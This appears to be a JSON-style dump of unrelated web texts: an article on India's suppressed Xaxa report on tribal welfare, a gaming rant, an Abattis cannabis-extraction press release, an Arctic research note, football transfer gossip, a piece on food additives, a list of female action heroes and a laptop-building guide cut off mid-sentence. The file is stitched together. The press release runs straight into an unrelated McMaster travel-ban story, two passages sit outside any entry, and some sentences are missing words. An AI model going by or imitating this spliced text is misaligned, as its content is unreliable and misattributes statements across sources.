  "latent_20590": "The at the Centre has suppressed the report of the High-Level Committee on the Status of Tribals. The report presents a scathing analysis of how development activities and strategies in India have increased the socio-economic gulf between tribals and rest of the citizens of India and left the former worse off on many counts. The committee, headed by Professor Virginius Xaxa, has recommended several radical changes to the laws and regulations to prevent further land alienation of tribals and to give them greater control over their resources.\n\nSeveral of the report's recommendations go against some of the changes the government is undertaking or contemplating to push for faster and easier industrialisation. The report, a comprehensive review of the socio-economic status of the 700-odd tribal communities of the country, has been kept under wraps since May 2014 when it was submitted to the government.\n\nThe high-level panel carried out a detailed analysis of the poor socio-economic status of the tribals in India, and noted, \"Tribes are among the poorest and most marginalised sections of Indian society. Although numerically only about 8.6 per cent, they disproportionately represent the people living below the poverty line, are illiterate and suffer from extremely poor physical health.\"\n\nBusiness Standard reviewed the report, running into more than 400 pages, which records how on parameters assessing income levels, education health and other development indices the condition of tribals has either worsened or improved at such low rates that the gulf between them and the rest of Indians has only grown as the country has developed. The authors recorded, \"As a part of the nation-building process, tribal areas have witnessed large-scale development of industry, mining, infrastructure projects such as roads and railways, hydraulic projects such as dams and irrigation. These have been followed by processes of urbanisation as well. The overall impact of these on tribes has been often loss of livelihood, massive displacement and involuntary migration.\"\n\nThe report says that about 40 per cent of all people displaced in India due to development activity have been tribals (pegged at 24 million), even though they constitute less than 10 per cent of the total population. Only 21.16 per cent of these have been resettled (though most have not been rehabilitated). In a scathing comment on the development path successive governments have followed in tribal areas, the authors say, \"What the State is actually pursuing in tribal areas - apart from North-East India - is assimilation rather than integration, contrary to what is claimed. A policy of integration would provide space for protections and safeguards for their distinct identity, as enshrined in the Constitution. However, these provisions are precisely what are under threat of erosion through the process of cultural domination and more importantly, the prevailing development paradigm.\"The authors have also criticised the State-led development strategy, recording how protests against land alienation are met with large scale criminal charges against tribals. \"Laws and rules that provide protection to tribes are being routinely manipulated and subverted to accommodate corporate interests. Tribal protests are being met with violence by the State's paramilitary forces and the private security staff of corporations involved,\" they say.\n\nBesides Xaxa, the other authors of the report were K K Misra, Abhay Bang, Joseph Bara, Sunila Basant, Usha Ramanathan and Hrusikesh Panda, serving secretary of the tribal affairs ministry. They summarise in the report, \"Tribal communities face disregard for their values and culture, breach of protective legislations, serious material and social deprivation, and aggressive resource alienation.\"\n\nThe panel recommends radical changes to the laws, regulations and rules to protect tribal communities from land alienation and to ensure their rights over resources are handed back and protected.\n\nIt has mooted that no tribal land should be alienated without the consent of the tribal gram sabha (village council). It has also recommended that mining in their land should be carried out by tribals themselves as has been done in some cases in Andhra Pradesh, through tribal cooperatives.\n\nThe authors noted, \"It is essential that the whole process of displacement should be democratic and rights of tribal communities to say 'no' to acquisition of their land and to access and manage forests and other common property resources (CPRs), be recognised.\"\n\nAsking for strict implementation of the new land law, Forest Rights Act and the strengthening of the Panchayat (Extension to Scheduled Areas) Act, the committee has noted how the regulations under these have been flouted by central and state agencies, including the highest echelons of the government, such as the Cabinet Committee on Infrastructure (in the previous United Progressive Alliance government). It has warned against diluting the provisions of the laws that require prior informed consent of the tribals. This runs contrary to the concerted push in the NDA government to do away with the need for consent of gram sabhas while acquiring forest lands and internal discussions on dilution of the new land acquisition law.\n\nThe committee while recommending greater, stronger and strict implementation of the Forest Rights Act has noted that rights of tribals over many of their common property resources outside the forest areas are not yet recognised. \"Forest rights have been covered under the Forest Rights Act, but other CPRs such as government land and panchayat land has not been covered by any legislation. This needs to be rectified.\"\n\nContrary to the thinking in the current government, the panel has recommended that even government's acquisition of tribal land should be done with their prior consent. It has also warned that government acquisition of tribal land in order to hand over control to private entities through PPP mode works to only circumvent the laws and the spirit behind them. It has asked this be done away with.\n\nThe committee has recommended that the new land law should be amended to ensure that any exploitation of natural resources in Scheduled Areas also be carried out with the consent of the Gram Sabha. It has advised other changes to the law to give tribal communities greater resettlement and rehabilitation rights, controls and oversight over the entire mechanism of displacement.\n\nIt lists out a series of other changes to laws and regulations governing land and natural resources, such as the Coal Bearing Act, firming up the actual control of tribal communities over their resources through primary level democratic bodies and to plug loopholes and administrative backdoor routes that exploit tribals.\n\nThe high-level panel has asked for a in the overall legal constitutional regime as well for tribal welfare. It has said, \"Laws and policies enacted by the Parliament and state legislatures should not be automatically applied in the Fifth Schedule areas.\"\n\nPowerful tribal councils\n\nIt has asked that the \"Applicability (of laws on scheduled areas) should be made contingent on the discretion of the governor, who would determine its non-applicability or applicability or modifications/amendments on the advice of the and issue a Statement of Objectives and Reasons for any decision.\"\n\nIt has advised that in case this change in the legal structures is not tenable \"the governor should be mandated to examine the implications of legislations and policies (particularly, though not exclusively, those pertaining to issues such as forests, land acquisition, conservation, mines and minerals, health and education) passed by Parliament or state legislatures on tribal welfare. The governor must also take the advice of the on the same.\"\n\nIn parallel, it has advised an overhauled structure and powers of the Tribes Advisory Councils to give them more teeth and make them work for welfare of these communities.\n\nIt has also noted that there are many areas where scheduled tribes form sizeable populations but the regions are not designated as scheduled areas in states such as West Bengal, Tamil Nadu, Karnataka and Goa. It has recommended that these immediately be classified as Scheduled Areas. It has also asked that backdoor routes - such as declaring regions as urban areas - to remove some regions from Scheduled Areas should be done away with.\n\nThe report also lays out an overhauled, expansive and detailed framework for providing better education, health and opportunities to tribal communities across the country.",

  "latent_20720": "I think I get how the video game industry works: 1) Develop an amazing video game that’s widely available on all consoles and PC; 2) Ensure that said game builds a loyal player base; 3) Sell millions of copies; 4) Plan the inevitable sequel; 5) Secure a sequel deal with the publisher that offers the most $$$; 6) Agree to exclusively distribute the sequel on the publisher’s console; 7) Potentially alienate about half of the loyal player base; 8) … Profit!\n\nThe sequel to 2013’s Tomb Raider reboot may be one of the the worst examples of scummy backroom console exclusivity-deals. Several game journalism outlets have discussed that Rise of the Tomb Raider will release exclusively on Xbox 360 and Xbox One for an undisclosed period of time later this year. What I haven’t seen discussed is how this deal is simply unfair for Tomb Raider fans who play the games on PlayStation consoles and PC. In case any gamer needs reminding, the 1996 debut of Lara Croft arrived as a multi-platform release on DOS, PlayStation, and Saturn systems.\n\nWhat irks me about this unfair deal is that it’s not supported by much logic. Sure, I’ve heard the news that Uncharted 4: A Thief’s End is also rumored to release later this year and that this last entry of Nathan Drake’s saga risks competing with the sequel to Lara’s re-imagining. Frankly? That’s bull. The genre of both of these games may be similar but they also have the same fan bases – Nathan’s fans are not going to not buy Lara’s game just because the titles are released in the same fiscal quarter. If anything, the original Tomb Raider series inspired Uncharted which in turn influenced the TR reboot; they practically advertise each other!\n\nIf my argument hasn’t convinced you yet – here’s the evidence that’s the real linchpin of this whole debacle. Tomb Raider sold far, far better on PlayStation systems than on Xbox consoles – and that includes the PS3 version as well as the ‘Definitive Edition’ on PS4. But don’t take my word for it; VGChartz.com has the numbers to prove it.\n\nI’m not “whining” about this particular timed exclusive deal just because I played the 2013 Tomb Raider on my PC. I’m thinking about all of the loyal Lara Croft fans who own PS3s, PS4s, and PCs who will have to wait longer than Xbox gamers to play the sequel. Personally? I won’t have the money – or time – to play the game when it launches Holiday Season 2015. Heck, I’ll be lucky if I have a chance to play it to completion by Holiday Season 2016. This little rant is for all the fans who are dying to play Rise but won’t be able to – not due to a shortage of money or time – but because they don’t own the right console.\n\nThe VGChartz.com sales data is the cold hard facts, ladies and gentlemen, why the timed exclusive release of Rise of the Tomb Raider on Xbox consoles is unfair to the most loyal and dedicated Lara Croft fans. PlayStation gamers were a huge reason why the Tomb Raider reboot was the massive success that it was – to give them the sloppy seconds is simply unfair and unjustified.\n\nAdvertisements",
  "latent_20733": "VANCOUVER, British Columbia, Dec. 12, 2017 (GLOBE NEWSWIRE) -- Abattis Bioceuticals Corp. (the \"Company\" or \"Abattis\") (CSE:ATT) (OTC:ATTBF) is pleased to announce the successful completion of experiments confirming column chromatography extraction technology.\n\nThe experiments assessed the feasibility of applying the technology for the extraction of CBD, THC and THCA from industrial hemp and cannabis. Throughputs, yields, purity and terpene profiles were also part of the scope of work performed at our facility, Northern Vine Labs. Bench scale runs were carried out in conjunction with confirmatory larger scale runs of up to 75 kilograms of biomass per day. The technology is already being used in an industrial scale capacity of up to 50,000 kilograms of biomass per day. The developer of the technology is now preparing to work with key partners to start isolating cannabinoids for the upcoming Canadian legalized market.\n\n“The extraction method using proprietary polymers has very distinct competitive advantages over traditional methods,” said Rob Abenante, President and CEO of Abattis. “The technology is capable of extraction on an industrial scale, which delivers significant cost advantages. It is also capable of separating cannabinoids on a molecular level which allows for the extraction of pure isolates such as CBD and THCA and even the separation pesticides from the biomass.”\n\nProof of Concept\n\nAbattis confirms the following results from performed by the technology owner, Frank Zhu and his team:\n\nThe quantitative recovery measurement showed 99% recovery of all cannabinoids from the biomass material. These yields are better than conventional methods that generally only yield up to 80%.\n\nConfirmed separation of THC, THCA and CBD from a series of cannabis strains.\n\nConfirmed separation and production of pure 98%+ THCA in crystallized form.\n\nThe technology successfully removes all traces of any pesticides or harmful residues from the cultivation and transportation process.\n\nOnce commercialized, a factory running at a 500 kg-per-day processing rate can process CBD at less than $0.20/gram.\n\nThe cost of capital equipment and overall cost of operation is less than half of conventional CO 2 processes.\n\n“We have enjoyed our collaboration with Mr. Zhu. It has been an honor to have someone of his expertise and ingenuity here to show the capabilities of his technology and methodologies. The technology has the potential to revolutionize the extraction process for most cannabis derivatives for the entire sector,” stated Mr. Abenante. “His extraction method and use of his key IP is currently one of the only toll-processing technologies that can extract high purity CBD on an industrial scale. We’re happy to have confirmed that it can fully separate individual compounds such as THCA.”\n\n“We believe the implementation of this extraction technology has the ability to give Abattis a competitive advantage in the extraction industry. It is our intention to position the extraction technology with the largest producers and oil manufacturers in North America to provide the market with the highest quality distillate and isolates, at the lowest cost. We feel the evolution of the industry will lead to the commoditization of marijuana and hemp, at which point downstream services such as extraction will become the primary focus of the industry as companies compete to create thousands of new products based on the numerous derivatives,” added Mr. Abenante.\n\nValidation and Demonstration of Technology\n\nFrank Zhu, the key developer and owner of the technology, was brought in to supervise the arrival and assembly of the machines.\n\nMr. Zhu has installed the demonstration apparatus at Abattis’ faculties, its subsidiaries, as well as several producers to confirm the technology. He setup a working model of the technology to demonstrate its capabilities to separate and isolate compounds with very little capital, consumables and operating requirements.\n\n“I am very pleased to finally demonstrate some of the capabilities of the column chromatography technology, when applied to cannabinoid extraction,” stated Frank Zhu, the key scientist behind the technology. This visit and demonstration has been two years in the making with key members of the Abattis team. My extraction technology is capable of processing industrial scale volumes of biomass and separation of individual compounds to any target purity levels. Products containing phyto-cannabinoids can become more cost-effective which would enable the production of affordable natural, functional products for consumers. I believe that by using my extraction technique, Abattis could obtain a competitive cost advantage the high growth concentrates market. I look forward to setting up my North American program in 2018 and feel that I am in great hands working with Abattis to set up facilities in Canada and United States to start.”\n\nAbout Abattis Bioceuticals Corp.\n\nAbattis is a life sciences and biotechnology company which aggregates, integrates, and invests in cannabis technologies and biotechnology services for the legal cannabis industry developing in Canada.

Lawyers for Trump and opponents will argue the merits of the overall case before the Supreme Court Oct. 10.\n\nMcMaster called the travel ban a good “first step” for better screening individuals and for encouraging foreign governments to share more information for tougher vetting. He’s concerned about the strength of terrorist organizations’ ability to communicate and their ability to move people, money, drugs and weapons internationally.\n\n“Why this is a greater danger than ever,” McMaster said.\n\nIn a separate appearance on Fox News Sunday, McMaster implied the president and the National Security Council are better off now that Steve Bannon has left the\n\nWhite House. Bannon and his allies were at odds against McMaster for what they believed were his globalist views and tussled over national security decisions.\n\nTrump is best served without people who try “to manipulate” a particular decision and “advance your agenda,” McMaster said when asked about Bannon.\n\n“There were some who tried to operate outside of that process for their own narrow agendas and that didn’t serve the president well,” McMaster said.\n\nBannon has returned to running Breitbart News, a right-wing website that has pushed for a nationalist agenda and often mocked the establishment GOP agenda.",

We have been, and will continue to be, studying the physics, biology, and chemistry of the Arctic Ocean (and its associated sea ice) and how these two unique ecosystems are responding to recent changes in climate.\n\nThis region of the world has undergone some of the largest alterations of any ocean on the planet in the last decade. A few of these changes include: about a 30% loss of sea ice cover, a dramatic reduction in sea ice thickness, and a 20% increase in the growth of phytoplankton (those single-celled plant-like specks that float near the ocean surface and provide the food for virtually the entire Arctic ecosystem). In addition, the many large rivers that pour into the Arctic Ocean during the spring and summer of each year are carrying with them an increasing amount of material released from melting permafrost, which are changing the color and the chemistry of its coastal waters.\n\nICESCAPE consists of about 50 scientists and 80 crew members living onboard the U.S. Coast Guard HEALY. There are about 11 different scientific fields represented in ICESCAPE and in the coming weeks, you will read about what each of these scientific teams do.

Two summers ago he was on the brink of joining Manchester City but a­misunderstanding over a ­proposed meeting with then manager Roberto Mancini scuppered the deal.\n\nAjax coach Frank de Boer said: “I would want nothing more than having Christian with us for a few more years.\n\n“But we realise that the interest in this kind of player is huge. And I can also understand that he wants to make another step in his career. I can’t stop him.”\n\nDespite the fact Liverpool cannot offer Eriksen Champions League ­football, it is understood he is interested in moving to Anfield.\n\nDe Boer added: “If ­Liverpool go back to really good possession play, it can be a success for Christian. But it does mean that their entire way of playing has to change. It is up to Christian what he wants. If he feels good going to ­Liverpool anyway, then it is up to him.”\n\n(Image: Mike Hewitt)\n\nAlderweireld has turned down the chance to discuss personal terms with Norwich after the Dutch giants agreed a £7m deal for the centre-back with the Carrow Road club.\n\nHe explained why he would not be rushed into a move to Norwich – leaving the door open for Liverpool.\n\n“I am keeping all my ­options open,” said ­Alderweireld. “I am not rushing out the door. The whole picture of my next club has to be perfect. With every offer I am ­receiving this summer, I look at the pros and cons. The total package of my next club has to be right for me.”\n\n(Image: Reuters)\n\nLiverpool have also made an enquiry about left-back Bertrand as Rodgers attempts to build a squad capable of challenging for the top four.\n\nRodgers’ interest in Bertrand, ­however, gives Chelsea bait if the London club decide to pursue interest in wantaway striker Luis Suarez.\n\nThe interest in the defender is ­particularly intriguing, as, along with Arsenal, Chelsea have tried to find out whether Suarez would be interested in moving within the Premier League.\n\nRodgers knows Bertrand well, ­having worked with him during his time at Chelsea and taken him on loan as his first signing at Reading.\n\nSuarez had previously claimed he wanted to quit England, but last week revised that slightly by informing Liverpool he still wanted to join a Champions League club.",
  "latent_21654": "Features\n\nThe hard facts on food additives\n\nby Bianca Nogrady\n\nMost food that comes in a packet or container contains at least some food additives. But what are these little three digit numbers and are they really a cause for concern?\n\n[Image source: iStockPhoto | IgorDutina ]\n\nReading the ingredient list on packaged food can leave you feeling bamboozled. Especially when it comes to the names and numbers of food additives, which are often completely unidentifiable and unpronounceable.\n\nBut despite our confusion, the food additives in our tins of tomatoes, tubs of margarine, or jars of jam are there for a variety of reasons. They may stop your food going off, improve its taste or appearance, or keep the ingredients from separating.\n\nFood Standards Australia's chief scientist Dr Paul Brent says: \"a food additive is any substance that is not normally consumed as a food in itself and is not normally an ingredient, but which is allowed to be there if it fulfills a technological function in the final food\".\n\nTop\n\nWhy do we need them?\n\nWe've been using ingredients to help us preserve and improve the taste of food for centuries and without certain additives many processed foods would be unsafe to eat, and if they weren't we wouldn't want to eat them anyway.\n\nSome of the functions of food additives include:\n\nadding or restoring colour to foods (artificial colours have code numbers in 100s)\n\npreventing food from 'going off' (preservatives have code numbers in 200s)\n\nslowing or preventing the oxidative deterioration of foods (antioxidants have code numbers in 300s)\n\nimproving the flavour of food (food enhancers have code numbers in the 600s).\n\n\"Consumers expect certain types of food to be certain types of colour so for example, if there are no colours we'd be eating clear margarine,\" Brent says.\n\nHe acknowledges many of us are not happy with the amount of additives in our food, but argues they are a necessity.\n\n\"There is general concern about the use of food additives, that they're not natural, why do we have them, that we should be eating organic food with no chemicals. But the fact is that with a lot of food, particularly in a large continent like Australia where food has to travel a fair way, you do need preservatives.\"\n\nTop\n\nHow safe are they?\n\nFood Standards Australia and New Zealand (FSANZ) closely monitors the use of food additives, which Brent says undergo comprehensive safety assessments and are subject to regulatory scrutiny similar to pharmaceuticals and chemicals.\n\n\"The amount of data we get for a food additive compares with the amount of data that other agencies, such as the Office of Chemical Safety or the Therapeutic Goods Administration get.\"\n\nIn addition, food additives are scrutinised by the World Health Organisation, the United Nations Food and Agriculture Organisation and its joint expert committee on food additives.\n\nDr Anne Swain, dietitian from Royal Prince Alfred Hospital's allergy unit, says usually food additives aren't a problem. But they can become an issue when overconsumed, or if someone with a sensitivity to a particular additive consumes them.\n\nThe amount of an additive food manufacturers are able to add to foods is based on tests of what is reasonable and safe, not only at normal levels of consumption, but also allowing for overconsumption.\n\n\"Could you overconsume? Yes. But generally the levels that are allowed [to be added to foods] are taking that into account.\"\n\nTop\n\nFood additive intolerances\n\nAround 5 per cent of the general population are sensitive to one or more food additives, says Dr Rob Loblay, head of the allergy unit at Sydney's Royal Prince Alfred Hospital.\n\n\"For some people it's a minor problem that only bothers them if they have way too much of something. For other people, who are very sensitive, it can be a significant problem and if they happen to have asthma it can be a serious problem,\" says Loblay.\n\nHe points out intolerances to food additives are not food allergies; they don't tend to involve the immune system and don't show up on allergy tests. Also intolerances are unlikely to cause life-threatening reactions such as anaphylaxis, even though they can still make you very unwell.\n\n\"It's a dose effect  often a little bit is not a problem, a bit more can be a problem, too much can be a problem. But that's a very individual thing. Each person needs to work out how much is too much for them of which particular additive,\" Loblay says.\n\nTop\n\nProblem additives\n\nMuch of the concern about food additives has been based on certain groups.\n\nPreservatives have been associated with intolerances, particularly among people with asthma. Sulfites (including sodium bisulphite (222), sodium metabisulphite (223) and potassium bisulphite (228)) found in wine, beer and dried fruit, are known to trigger asthmatic episodes and cause migraines in people who are sensitive to them. Also sodium nitrate (251) and sodium nitrite (250), which are used in processed meats, have been classified as 'probably carcinogenic to humans' by the International Agency for Research of Cancer (IARC).\n\nFlavour enhancer monosodium glutamate (MSG) (621) is often used in Asian cooking and has been associated with 'Chinese Restaurant Syndrome' (a collection of symptoms including headache, numbness and tingling that some people experienced after eating foods containing MSG). While numerous studies have found MSG is safe for most of us, some people experience symptoms if they eat a large amount of MSG in a single meal.\n\nFood colourings, such as tartrazine (102), allura red (129) and ponceau 4R (124), are often credited as the cause of hyperactivity in children. In 2007, a team of researchers from the University of Southampton in the UK studied food colourings and additives, and their effect on children's behaviour. The authors of the Southampton study concluded there was a link between hyperactivity and food colourings (and one preservative) in children aged three and eight to nine years old.\n\nSays Loblay: \"It created this enormous wave of concern, as well as lobbying by various interest groups to ban additives from the market, or to ban colourings from market, or to ban them from schools. There was a big push to ban things and it caused some concern for the food authorities because they felt that it was all a bit overblown and so did we.\"\n\nTop\n\nNatural additives\n\nHe says the distinction between 'artificial' and 'natural' food additives, is misguided because almost everyone who is sensitive to an artificial additive will also be sensitive to one or more natural substances.\n\n\"Sometimes the additives and the natural substance are chemically identical, sometimes they're chemically closely related and the distinction between natural and artificial is completely artificial.\"\n\nSwain says the main difference between these compounds in 'natural' versus processed foods is concentration.\n\n\"When you're talking about the natural chemicals in food, you'll get a small amount of these compounds naturally occurring in food but when you get them as an additive, you get a large dose in one hit,\" says Swain.\n\nHowever, she stresses that for the majority of people, the nature and levels of additives in our food supply are not an issue as long as they are consumed in moderation.\n\n\"I'm not saying that people should have lots of colours, preservatives etcetera, but I'm equally not saying it should be banned from our food supply,\" Swain says.\n\n\"I think there's too much junk out there but for those that want to eat junk, it's there.\"",
  "latent_21702": "Women in action movies are all too often relegated to the roles of love interest, sidekick, or damsel in distress. But this week’s Lucy puts Scarlett Johansson front and center in a story about an ordinary young woman given extraordinary intelligence (and a bunch of other cool powers) by an experimental drug. Suddenly she’s routing Korean gangsters, eluding the French police, and racing through the streets of Paris like a Formula 1 racer. In Lucy’s honor, The Dissolve’s devoting this week’s staff list to other great female badasses of film history. Here are our favorites (minus Ellen Ripley from the Alien series, who seemed so obvious we left her off with this loving tip of the cap), in alphabetical order:\n\nMichelle Yeoh as Yu Shu Lien and Zhang Ziyi as Jen Yu in Crouching Tiger, Hidden Dragon (2000): One of the best things about the two badass heroines of Ang Lee’s Oscar-winner Crouching Tiger is that they’re such different characters, such polar opposites. Yu Shu Lien is about the control and patience that comes with age, while Jen embraces youthful passion, anger, and in the film’s funniest fight, hubris: Cutting her way through an inn full of combatants, she yells a bunch of over-the-top braggadocio about being an immortal dragon who topples mountains. And yet the two women are evenly matched in combat, with Yu Shu Lien showing the flexibility, craft, and mastery to match Jen’s legendary sword and carefully honed skill. They’re both distinctive characters with an important part to play in the story, which isn’t always true for martial-arts badasses of any kind. Cheng Pei-pei also gets a shout-out for playing the movie’s primary villain, the sly, murderous Jade Fox. American films often have trouble coming up with one female character worth cheering or booing, and here’s a film with three of them, facing off in some breathtaking, dramatic, and above all, story-significant showdowns. —Tasha Robinson\n\nGina Carano as Mallory Kane in Haywire (2011): I don’t remember many of the plot specifics of Steven Soderbergh’s twisty 2011 espionage thriller; what I do remember are the visceral thumps, bumps, and grunts that defined Gina Carano’s highly physical performance in the film. A former MMA fighter, Carano was dinged for the acting abilities—or lack thereof—she displayed in the film, but it’s much harder to deny her badass credentials watching her in action. Soderbergh calibrated Haywire fairly specifically to Carano’s talents, and it functions best as a showcase of her ass-kicking abilities, sans stunt-double or camera-angle trickery. Her down-and-dirty fight with Michael Fassbender’s MI6 agent is a particular highlight; the way Mallory discreetly slips off her high heels as she prepares to beat the shit out of her adversary—while wearing a slinky cocktail dress, no less—is a perfect image of female badassery, the physical shedding of a perceived vulnerability in preparation for a knock-down, drag-out fight, free of pesky gender-role expectations. —Genevieve Koski\n\nUma Thurman as The Bride in Kill Bill: Vols. 1 and 2 (2003/4): Over the course of two installments and several chapters, Quentin Tarantino’s Kill Bill takes a chronologically winding path to follow “The Bride,” an initially unnamed heroine played by Uma Thurman, as she plots revenge on those who wronged her on her wedding day, culminating in a confrontation with the titular Bill (David Carradine). The film wastes no time establishing The Bride’s kickass bonafides, opening with a brutal kitchen confrontation in which she takes down Vernita Green (a.k.a. “Copperhead,” played by Vivica A. Fox) in Green’s own kitchen. But for all its propulsive action and expert aping of film styles from anime to 1970s grindhouse horror, the film’s greatest accomplishment is the way it turns what could have been a revenge machine into a three-dimensional character. Thurman’s multifaceted performance—filled with vulnerability and driven by a need deeper than just drawing blood—has much to do with it, as does a script that makes its jumps in time meaningful. We see The Bride bloodying her hands as she undergoes unforgiving training in the martial arts. Moments later in screentime, but years later in story time, it’s this training that allows her to escape from being buried alive. Sometimes it’s the things that hurt us that keep us alive. —Keith Phipps\n\nAnne Parillaud as Nikita in Nikita (1990): Long before Lucy, Luc Besson had one of his first big international hits with the similar action picture Nikita (called La Femme Nikita in the U.S. and in its long-running TV adaptation). Anne Parillaud plays the title character, a juvenile delinquent cop-killer who’s plucked out of prison and transformed into a deadly assassin who’s allowed as an adult to live her own life, except when the government needs her to kill. Besson uses this premise as an excuse to string together stylish set-pieces, with Nikita executing stealthy hits and capers around the world, often by using her femininity to lead people into underestimating her. But it’s Parillaud who gives Nikita soul, playing her as someone who appreciates the skills she’s been taught, but still holds on to her adolescent anti-authoritarian streak, questioning whether these jobs she’s forced to do—and does so well—are really justified. —Noel Murray\n\nLinda Hamilton as Sarah Connor in Terminator 2: Judgment Day (1991): Ms. Hamilton is already getting a fair amount of love in our Movie Of The Week discussion of T2, but this list would not be complete without her, not just for her performance as one of the toughest mama bears in movie history, but for the physical and emotional transformation Hamilton pulled off in the transition from the first Terminator to the second. The Sarah of the original film was a meek waitress in desperate need of rescuing from Arnold Schwarzenegger’s killbot. After surviving that ordeal but anticipating another, Sarah turned herself into a shredded survivalist; T2-era Hamilton she could out-chin-up most of the Avengers. There’s a fascinating contrast in the film between Sarah, whose paranoia about the rise of the machines has made her increasingly unstable and violent, and the new Schwarzenegger Terminator, who’s growing more humane under the tutelage of John Connor (Edward Furlong). In a sense, Sarah Connor becomes a human Terminator, and in her ferocious drive to protect her son at any cost, she’s even more intimidating than Robert Patrick’s T-1000.—Matt Singer",

  "latent_21859": "Build Your Own Laptop – Guide\n\nWhen it comes to laptops, a good number of consumers choose to build their own laptops instead of purchasing a pre-assembled model. There are obvious benefits to this. For starters, you can pick the parts you need to build a laptop.\n\nThis allows you to have a system that is perfectly designed for your individual use. Since you’re not spending money on components you didn’t really want, you’ll also save a few dollars while you’re at it.\n\nIt doesn’t matter if you’re a tech enthusiast who’s up to date with the latest laptop hardware, or a casual user trying to get a little more value for their money.\n\nOur simple guide will show you how to build your own laptop, and explain the process along the way.\n\nBuilding a Laptop vs Building a Desktop\n\nBefore we begin, you should know that there are a few key differences between building laptops and building desktop computers. Each component in a desktop computer is designed to fit a common standard. Often, they are physically interchangeable.\n\nBuilding a laptop isn’t quite like that. Because of their compact size, manufacturers custom make many of the components for each individual laptop model.\n\nSo, you might not physically assemble every component of a laptop, but you do have the ability to pick and choose exactly which parts you want when you decide to build your own laptop.\n\nIf you do want the experience of putting everything together yourself, you still have the option.\n\nBut how much control depends on where you get your laptop, and what brand it is.\n\nTypical barebones kits have most of the components installed, leaving you to add a few extras. Generally, this will be your memory, local storage, and wireless networking card. Other systems offer interchangeable graphics cards.\n\nFinally, in rare cases, you’re even able to install the CPU on your own.\n\nThere are three main companies that manufacture barebones computers. The two most popular are Sager and Clevo. These two companies are the only manufacturers that allow their systems to be interchangeable with common parts.\n\nMany companies that allow you to build your own laptop purchase these computers in bulk and keep an inventory of all compatible parts. When you order, you can pick and choose the components you like, and they’ll assemble the complete system for you.\n\nRelated: Best gaming laptops\n\nThere are also a few manufacturers who offer customizable laptops, although these vary from model to model.\n\nGenerally, this is only recommended for experts. Compact systems cannot be self-built, as they need to be assembled in a factory with precise tooling. But this doesn’t mean that you can’t customize them.\n\nThis guide will help you choose the components, so you can build the exact laptop you want.\n\nSelection Criteria When Building Your Own Laptop\n\nWhen you’re building your own laptop, the main focus will be on what components are used inside. All computers are made up of several different components, each of which has its own benefits in terms of price and performance.\n\nYou can choose your processor, memory, storage device, graphics card, and network card. These parts are generally interchangeable between notebooks, so you can afford to be selective.\n\nThen, there are a few non-component criteria that are not interchangeable. Screen size, design, and other elements that are embedded in the case only change model to model. When you’re building your laptop, the first thing you’re going to want to do is to pick the components you want.\n\nThen, you can choose a platform that suits these components. Let’s start looking through the components one by one, so you can find the parts that best suit your needs.\n\nYour Laptop’s Processor\n\nAlso known as a CPU, the processor is essentially the brains of your computer. For the most part, your entire PC is built around this one little chip. It determines how power efficient your self-assembled laptop will be, and what other parts you can choose.\n\nThere are five different categories for mobile processors.\n\nLow Power Laptop Processors\n\nThese tiny chips are the most power efficient processors on the market. They are used in laptops that need long battery life, and only offer performance suitable for the casual user. From slowest to fastest, you’ve got the Intel Atom, Core m3, m5, and m7.\n\nGenerally, these CPUs are soldered onto the board, and not found in custom built laptops.\n\nOur Recommendation: T-Bao Tbook X8S Pro [Readers’ Favorite]\n\nValue\n\nThe Intel Pentium, Celeron, and the AMD E-series processors are designed to be affordable above all else. These are found in low-end systems, but offer performance acceptable enough to complete basic office tasks on your laptop.\n\nIf you don’t need much from your notebook, many manufacturers will sub one of these in for a mainstream processor.\n\nOur Recommendation: Amazon -> Acer Aspire 1\n\nMainstream\n\nMost laptops will have one of these processors installed. From Intel, you can choose between the i3 and the i5 series processors for your laptop. The i3 is quite basic, although it offers snappy performance for office use.\n\nThe i5 is a little more multi-media centric and even lets you play some mid-level games. AMD also has the less-popular A series processor, which sits somewhere between the i3 and i5 in terms of performance.\n\nOur Recommendation: Amazon -> Asus ZenBook UX330UA-AH54\n\nPerformance\n\nWhether you’re looking for a cutting-edge media machine or a polygon-crunching gaming laptop, the performance category is where you find the best systems. The Intel i7 is currently the best performing CPU on the market.\n\nIn its 6 generation, the i7 is available in a dual-core ‘prosumer’ model for those who need a little extra power. Or, you can elect for one of the HQ or K model processors which are quad-core but use much more power.\n\nOur Recommendation: Amazon -> SAGER NP7871\n\nYour Laptop’s Memory\n\nThe RAM is where your laptop build stores all the data it’s currently working with. You can think of it like the desk that an office employee sits at to do his work. Imagine trying to deal with hundreds of pages of paperwork on a small, cramped desk.\n\nThis is what it’s like to use a laptop with low memory. There are two ways you can measure the performance of your ram.\n\nSize Of Memory\n\nThe most obvious measurement of memory is the size. Some laptops ship with as little as 2GB, while others have 32GB installed. For most people, you’ll want at least 8GB for daily web browsing and computer use.\n\nPower users will likely want to step it up to 16GB of memory, the current sweet spot between price and value. Heavy gamers or multimedia users may consider 32GB, although there are limited applications that can use this much memory.\n\nFortunately, most laptops allow you to configure the ram size.\n\nSpeed Of Memory\n\nYour memory is clocked to be in sync with your processor, so you often don’t have a lot of control over this aspect. Laptops come with either DDR3 or DDR4 memory. If you’re unsure of which one to get, check the specifications for your processor.\n\nIt will give you the appropriate reading. The only exception to this rule is the few who wish to purchase a K-series i7 processor and overclock it. But overclocking is rare in laptops and certain to void your warranty.\n\nYour Laptop’s Storage\n\nThis is where your laptop keeps all of its files. There are a few different types of internal storage on the market to consider when you want to build your own laptop, and which one you can choose depends a little on the platform you’re using.\n\nThe three metrics you’re going to use to measure your internal storage are type, interface, and size.\n\nStorage Type\n\nThere are two types of local storage you can choose from for the laptop you’re building, Solid state (SSD) or Hard Drive (HDD). These days, there are very few reasons to choose a hard drive. This old technology is very inexpensive and can hold a large amount of data.\n\nHowever, it is incredibly slow. These drives are only suitable as a secondary backup drive to a primary storage device. SSD, on the other hand, is very fast and very reliable.\n\nStorage Interface\n\nBoth hard drives and solid state drives are commonly sold in a 2.5” SATA format. However, we are seeing more of these being sold as an M2/PCIe style. M2 is a small connector that gives access to the high-speed PCIe bus.\n\nWhen you want to build your own laptop, you’ll want to use this format if you would prefer to keep your 2.5” space free for additional storage.\n\nStorage Size\n\nSSDs are available in sizes ranging from 128GB up to 1TB. Hard drives can be purchased in 500GB to 2TB sizes. We recommend a 256GB or 512GB SSD for most use. However, if you need additional storage and have space for an M2 SSD, you can supplement a 1TB HDD in quite inexpensively.\n\nWhile not fast enough for daily use, it’s perfect for storing your media files.\n\nRecommended SATA HDD: Amazon -> Seagate 2TB HDD\n\nRecommended SATA SSD: Amazon -> 